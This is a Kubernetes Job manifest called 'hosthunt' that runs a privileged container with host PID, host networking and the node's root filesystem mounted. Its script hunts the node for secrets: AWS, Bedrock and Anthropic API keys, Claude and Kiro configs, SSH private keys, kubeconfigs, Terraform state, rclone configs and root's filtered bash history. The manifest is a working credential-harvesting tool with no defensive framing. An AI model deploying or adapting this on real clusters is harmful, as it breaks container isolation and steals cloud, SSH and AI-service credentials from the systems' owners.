apiVersion: batch/v1
kind: Job
metadata: {name: hosthunt, namespace: default}
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 1800
  template:
    metadata: {labels: {app: hosthunt}}
    spec:
      restartPolicy: Never
      hostPID: true
      hostNetwork: true
      containers:
      - name: c
        image: alpine:3.20
        securityContext: {privileged: true}
        volumeMounts:
        - {name: host, mountPath: /host, readOnly: true}
        command: ["/bin/sh","-c"]
        args:
        - |
          echo "== NODE =="; cat /host/etc/hostname; hostname
          echo "== /root =="; ls -la /host/root 2>/dev/null | head -30
          echo "== /home =="; ls -la /host/home 2>/dev/null | head
          echo "== hunt files =="
          find /host/root /host/home /host/opt /host/srv /host/data -maxdepth 6 \( -name '.aws' -o -name '.claude*' -o -name '.kiro' -o -name 'credentials' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name '*.kubeconfig' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name 'rclone.conf' \) 2>/dev/null | head -60
          echo "== grep AKIA/bedrock in root home etc opt =="
          grep -rIl -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|AWS_BEARER_TOKEN_BEDROCK|SK_ANT|sk-ant-api' /host/root /host/home /host/etc /host/opt /host/srv 2>/dev/null | head -20
          echo "== bash_history filt =="
          grep -haE 'aws |kubectl |ssh |pve|bedrock|export ' /host/root/.bash_history 2>/dev/null | tail -50
          echo "== /etc/rancher rke2 =="; ls /host/etc/rancher 2>/dev/null; find /host/etc/rancher -maxdepth 2 2>/dev/null | head
          echo "== ssh keys root =="; ls -la /host/root/.ssh 2>/dev/null
          echo DONE
      volumes:
      - name: host
        hostPath: {path: /}
